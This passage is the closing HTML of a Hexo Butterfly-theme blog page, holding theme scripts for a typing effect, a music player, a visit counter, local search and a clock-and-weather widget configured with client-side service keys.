data-click="true"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
  function butterfly_clock_anzhiyu_injector_config(){
    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
    console.log('已挂载butterfly_clock_anzhiyu')
    if(parent_div_git) {
      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  }
  var elist = '/2022/,/2023/,/2024/'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var qweather_key = 'eb7ef47cda914d65b0b394ce50c15242';
  var gaud_map_key = 'e2b04289e870b005374ee030148d64fd&s=rsv3';
  var baidu_ak_key = 'undefined';
  var flag = 0;
  var clock_rectangle = '112.982279,28.19409';
  var clock_default_rectangle_enable = 'true';

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_clock_anzhiyu_injector_config();
  }
  else if (epage === cpage){
    butterfly_clock_anzhiyu_injector_config();
  }
  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><!-- hexo injector body_end end --></body></html>